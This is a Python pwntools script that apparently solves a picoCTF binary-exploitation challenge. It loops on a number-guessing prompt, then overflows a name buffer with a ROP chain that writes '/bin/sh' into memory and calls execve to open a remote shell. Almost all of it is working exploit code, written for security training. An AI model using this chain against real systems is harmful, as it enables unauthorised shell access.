#!/usr/bin/env python3

#Imports...

import struct
from pwn import *

#Connect to challenge...

host = 'jupiter.challenges.picoctf.org'
port = 26735
# Initialize P

p = b''

# Step 1 -- Write-what-where gadgets
#
#        [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
#        [+] Gadget found: 0x410ca3 pop rsi ; ret
#        [+] Gadget found: 0x4163f4 pop rax ; ret
#        [+] Gadget found: 0x445950 xor rax, rax ; ret

r = remote(host, port)

elf = ELF('./vuln')
# win = function within vuln
win = p64(elf.symbols['win'])
bin_sh = b'/bin/sh\x00'
# Target for bin_sh, came from obj_dump of .data section of vuln
bin_sh_addr = p64(0x6ba460)

write_gadget = b''
# Puts bin_sh into rax
write_gadget += p64(0x4163f4) + bin_sh
# Write address in rsi
write_gadget += p64(0x410ca3) + bin_sh_addr
# XOR it
write_gadget += p64(0x47ff91) + p64(0x445950)

print("[+] Putting bin_sh into rax...\n[+] Writing to rsi...\n[+] xor'ing it...")

print("[+] Initializing assembly instructions...")
# Now initialize assembly instructions...

pop_rax = p64(0x00000000004163f4)
pop_rdi = p64(0x0000000000400696)
pop_rsi = p64(0x0000000000410ca3)
pop_rdx = p64(0x000000000044a6b5)
syscall = p64(0x000000000040137c)

print("[+] Putting it all together now")
# Putting it all together now...
junk = b'a' * 120

p = write_gadget + pop_rax + p64(0x3b) + pop_rdi + bin_sh_addr + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

payload = junk + p

print("[+] Trying to exploit now...")
while 1:
    r.recvuntil('What number would you like to guess?')
    r.sendline(b'66')
    r.recvline()
    resp = r.recvline()
    if 'Congrats' in resp.decode():
        r.recvuntil('Name? ')
        r.sendline(payload)
        r.interactive()
        break
